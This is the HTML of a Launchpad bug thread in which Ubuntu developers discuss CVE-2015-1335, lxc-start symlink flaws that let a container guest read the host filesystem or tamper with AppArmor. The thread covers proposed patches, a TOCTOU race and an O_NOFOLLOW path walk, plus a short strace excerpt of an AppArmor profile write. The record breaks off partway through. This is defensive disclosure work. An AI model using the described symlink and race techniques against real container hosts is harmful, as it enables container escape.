     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/4" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~roman-fiedler-deactivatedaccount" class="sprite person-inactive">Roman Fiedler (roman-fiedler-deactivatedaccount)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-21T16:01:13.557857+00:00" title="2015-07-21 16:01:13 UTC">on 2015-07-21</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/4"> #4</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>The pivot_root part looks more solid - the &quot;.&quot; -&gt; &quot;.&quot; should make any symlink trickery with host / impossible here, the MS_SLAVE should do the rest. But perhaps someone else may take a look ...</p>
<p>The apparmor modification may still work, I do not see major differences preventing it. Do you know of critical features allowed in lxc-start that would be disabled by standard container profile with that?</p>
<p>25741 open(&quot;/<wbr />proc/1/<wbr />attr/current&quot;<wbr />, O_WRONLY) = 11<br />
25741 write(11, &quot;changeprofile lxc-container-<wbr />default&quot;<wbr />, 35) = 35</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">The pivot_root part looks more solid - the "." -&gt; "." should make any symlink trickery with host / impossible here, the MS_SLAVE should do the rest. But perhaps someone else may take a look ... 

The apparmor modification may still work, I do not see major differences preventing it. Do you know of critical features allowed in lxc-start that would be disabled by standard container profile with that?

25741 open("/proc/1/attr/current", O_WRONLY) = 11
25741 write(11, "changeprofile lxc-container-default", 35) = 35
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/5" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~stgraber" class="sprite person">Stéphane Graber (stgraber)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-21T17:06:04.943692+00:00" title="2015-07-21 17:06:04 UTC">on 2015-07-21</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/5"> #5</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Indeed, this is still an issue. Sounds like the best way to fix this is:<br />
&nbsp;- Backport the pivot_root change to the 1.0 branch (but without the deprecation warning, just silently ignore it)<br />
&nbsp;- Refuse to mount anything to a destination path which happens to be a symlink</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Indeed, this is still an issue. Sounds like the best way to fix this is:
 - Backport the pivot_root change to the 1.0 branch (but without the deprecation warning, just silently ignore it)
 - Refuse to mount anything to a destination path which happens to be a symlink</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/6" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-24T18:27:41.010573+00:00" title="2015-07-24 18:27:41 UTC">on 2015-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/6"> #6</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>(working on a patch for (2) today)</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">(working on a patch for (2) today)</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/7" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-24T23:53:55.942474+00:00" title="2015-07-24 23:53:55 UTC">on 2015-07-24</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/7"> #7</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4433778/+files/0001-Prevent-mounting-onto-symlinks-inside-a-container.patch">Proposed patch to prevent lxc-start mounting onto symlinks</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4433778">Edit</a>
        (4.4 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10"></textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/8" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-30T00:10:57.257840+00:00" title="2015-07-30 00:10:57 UTC">on 2015-07-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/8"> #8</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Hi Serge - this patch looks good for the most part but I&#x27;m curious if it is possible for a container admin to modify the target path during or after the ensure_<wbr />not_symlink(<wbr />) checks and before the mount? It feels like there&#x27;s a TOCTOU issue in there but maybe the admin can&#x27;t possibly make changes while the check is happening?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Hi Serge - this patch looks good for the most part but I'm curious if it is possible for a container admin to modify the target path during or after the ensure_not_symlink() checks and before the mount? It feels like there's a TOCTOU issue in there but maybe the admin can't possibly make changes while the check is happening?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/9" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-30T18:46:50.714799+00:00" title="2015-07-30 18:46:50 UTC">on 2015-07-30</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/9"> #9</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Yup, that race is there in theory.  This appears to be yet another reason to push for a &#x27;fdmount/mountat&#x27; function.  But lacking that I&#x27;m not sure how we can prevent this.</p>
<p>Do you have any suggestions?</p>
<p>If we have the separate fix in apparmor for writing to /proc/self/<wbr />attr/current, and the pivot_root update backported, what other attacks remain meaningful here?</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Yup, that race is there in theory.  This appears to be yet another reason to push for a 'fdmount/mountat' function.  But lacking that I'm not sure how we can prevent this.

Do you have any suggestions?

If we have the separate fix in apparmor for writing to /proc/self/attr/current, and the pivot_root update backported, what other attacks remain meaningful here?</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/10" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-07-31T05:52:23+00:00" title="2015-07-31 05:52:23 UTC">on 2015-07-31</time><span class="editable-message-last-edit-date">:
              </span>
              <a href="/ubuntu/+source/lxc/+bug/1476662/comments/10">
                <strong>Re: [Bug 1476662] Re: lxc-start symlink vulnerabilities may allow guest to read host filesystem, interfere with apparmor</strong>
              </a>
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/10"> #10</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>On 2015-07-30 18:46:50, Serge Hallyn wrote:<br />
<span class="foldable-quoted">
&gt; Yup, that race is there in theory.  This appears to be yet another<br />
&gt; reason to push for a &#x27;fdmount/mountat&#x27; function.  But lacking that I&#x27;m<br />
&gt; not sure how we can prevent this.<br />
&gt;<br />
&gt; Do you have any suggestions?
</span></p>
<p>You could split all of the path components up into an array (or however<br />
you want to iterate over them) and then walk each component of the path<br />
like so:</p>
<p>for (component = components[0]; component; component++) {<br />
&nbsp;&nbsp;fd = open(dirfd, component,<br />
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<wbr />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;O_<wbr />CLOEXEC | O_NOFOLLOW | O_DIRECTORY | O_RDONLY);<br />
&nbsp;&nbsp;fchdir(fd);<br />
&nbsp;&nbsp;close(dirfd);<br />
&nbsp;&nbsp;dirfd = fd;<br />
}<br />
close(fd);<br />
mount(source, &quot;.&quot;, ...);</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">On 2015-07-30 18:46:50, Serge Hallyn wrote:
&gt; Yup, that race is there in theory.  This appears to be yet another
&gt; reason to push for a 'fdmount/mountat' function.  But lacking that I'm
&gt; not sure how we can prevent this.
&gt; 
&gt; Do you have any suggestions?

You could split all of the path components up into an array (or however
you want to iterate over them) and then walk each component of the path
like so:

for (component = components[0]; component; component++) {
  fd = open(dirfd, component,
            O_CLOEXEC | O_NOFOLLOW | O_DIRECTORY | O_RDONLY);
  fchdir(fd);
  close(dirfd);
  dirfd = fd;
}
close(fd);
mount(source, ".", ...);
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/11" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-03T00:25:07+00:00" title="2015-08-03 00:25:07 UTC">on 2015-08-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/11"> #11</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Quoting Tyler Hicks (&lt;email address hidden&gt;):<br />
<span class="foldable-quoted">
&gt; On 2015-07-30 18:46:50, Serge Hallyn wrote:<br />
&gt; &gt; Yup, that race is there in theory.  This appears to be yet another<br />
&gt; &gt; reason to push for a &#x27;fdmount/mountat&#x27; function.  But lacking that I&#x27;m<br />
&gt; &gt; not sure how we can prevent this.<br />
&gt; &gt;<br />
&gt; &gt; Do you have any suggestions?<br />
&gt;<br />
&gt; You could split all of the path components up into an array (or however<br />
&gt; you want to iterate over them) and then walk each component of the path<br />
&gt; like so:<br />
&gt;<br />
&gt; for (component = components[0]; component; component++) {<br />
&gt;   fd = open(dirfd, component,<br />
&gt;             O_CLOEXEC | O_NOFOLLOW | O_DIRECTORY | O_RDONLY);<br />
&gt;   fchdir(fd);<br />
&gt;   close(dirfd);<br />
&gt;   dirfd = fd;<br />
&gt; }<br />
&gt; close(fd);<br />
&gt; mount(source, &quot;.&quot;, ...);
</span></p>
<p>Haha.  I guess that works :)  mount with &#x27;.&#x27; was escaping me - thanks!</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Quoting Tyler Hicks (tyhicks@canonical.com):
&gt; On 2015-07-30 18:46:50, Serge Hallyn wrote:
&gt; &gt; Yup, that race is there in theory.  This appears to be yet another
&gt; &gt; reason to push for a 'fdmount/mountat' function.  But lacking that I'm
&gt; &gt; not sure how we can prevent this.
&gt; &gt; 
&gt; &gt; Do you have any suggestions?
&gt; 
&gt; You could split all of the path components up into an array (or however
&gt; you want to iterate over them) and then walk each component of the path
&gt; like so:
&gt; 
&gt; for (component = components[0]; component; component++) {
&gt;   fd = open(dirfd, component,
&gt;             O_CLOEXEC | O_NOFOLLOW | O_DIRECTORY | O_RDONLY);
&gt;   fchdir(fd);
&gt;   close(dirfd);
&gt;   dirfd = fd;
&gt; }
&gt; close(fd);
&gt; mount(source, ".", ...);

Haha.  I guess that works :)  mount with '.' was escaping me - thanks!
</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/12" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~mdeslaur" class="sprite person">Marc Deslauriers (mdeslaur)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-03T17:39:58.513900+00:00" title="2015-08-03 17:39:58 UTC">on 2015-08-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/12"> #12</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This is CVE-2015-1335</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This is CVE-2015-1335</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/13" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-03T20:20:04.806333+00:00" title="2015-08-03 20:20:04 UTC">on 2015-08-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/13"> #13</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ah, right, the mount(&quot;.&quot;) doesn&#x27;t work in the (very common) case of file mounts.  We could special-case the file mount case to there chdir to the parent and then mount onto the filename, but that still allows for a TOCTTOU.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ah, right, the mount(".") doesn't work in the (very common) case of file mounts.  We could special-case the file mount case to there chdir to the parent and then mount onto the filename, but that still allows for a TOCTTOU.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/14" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-03T20:20:30.573009+00:00" title="2015-08-03 20:20:30 UTC">on 2015-08-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/14"> #14</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    <ul style="margin-bottom: 1em">
      <li class="download-attachment">
        <a class="sprite haspatch-icon" href="https://bugs.launchpad.net/ubuntu/+source/lxc/+bug/1476662/+attachment/4438472/+files/0001-Prevent-mounting-onto-symlinks-inside-a-container.patch">0001-Prevent-mounting-onto-symlinks-inside-a-container.patch</a>
        <a class="sprite edit action-icon" href="/ubuntu/+source/lxc/+bug/1476662/+attachment/4438472">Edit</a>
        (7.0 KiB,
        text/plain)
      </li>
    </ul>

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>This is the v2 of the patch - which breaks lxc by not handling mounting onto files.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">This is the v2 of the patch - which breaks lxc by not handling mounting onto files.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/15" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~tyhicks" class="sprite person">Tyler Hicks (tyhicks)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-03T23:21:00.198994+00:00" title="2015-08-03 23:21:00 UTC">on 2015-08-03</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
          <td class="bug-comment-index">
          <a itemprop="url" href="/ubuntu/+source/lxc/+bug/1476662/comments/15"> #15</a>
          </td>
        </tr>
      </tbody>
    </table>
  </div>

  <div class="boardCommentBody">
    

    

    

  
  <div class="editable-message-body">
    <div class="comment-text editable-message-text" itemprop="commentText"><p>Ugh, I didn&#x27;t think about bind mounting files. I can&#x27;t think of any solutions for that scenario that would not require kernel changes.</p>
<p>Thanks for trying out the idea.</p></div>
    
    
    
  </div>

  <div class="editable-message-form" style="display: none">
     <textarea style="width: 100%" rows="10">Ugh, I didn't think about bind mounting files. I can't think of any solutions for that scenario that would not require kernel changes.

Thanks for trying out the idea.</textarea>
     <input type="button" value="Update" class="editable-message-update-btn" />
     <input type="button" value="Cancel" class="editable-message-cancel-btn" />
  </div>


  </div>

  
  
</div>

          

          

          

        
        
          
            <div xmlns="http://www.w3.org/1999/xhtml" itemscope="" itemtype="http://schema.org/UserComments" class="boardComment editable-message
                  " data-baseurl="/ubuntu/+source/lxc/+bug/1476662/comments/16" data-i-can-edit="False">
  <div class="boardCommentDetails">
    <div class="message-revision-container">
      <div class="message-revision-container-header">
        <span>Revision history for this message</span>
        <img src="/+icing/build/overlay/assets/skins/sam/images/close.gif" class="message-revision-close" />
      </div>
      <script type="text/template">
        <div class='message-revision-item'>
          <div class='message-revision-title'>
              <a class="sprite remove action-icon message-revision-del-btn">
                  Remove
              </a>
              <a class="js-action">
                  Revision #{revision}, created at {date_created_display}
              </a>
          </div>
          <div class='message-revision-body'>{content}</div>
        </div>
      </script>
      <div class="message-revision-list"></div>
    </div>

    <table>
      <tbody>
        <tr>
          <td>
            <a href="https://launchpad.net/~serge-hallyn" class="sprite person">Serge Hallyn (serge-hallyn)</a>
            wrote
            <time itemprop="commentTime" datetime="2015-08-04T00:43:54.403129+00:00" title="2015-08-04 00:43:54 UTC">on 2015-08-04</time><span class="editable-message-last-edit-date">:
              </span>
              
          </td>
          

          <td>
            
          </td>
          <td>
            
          </td>
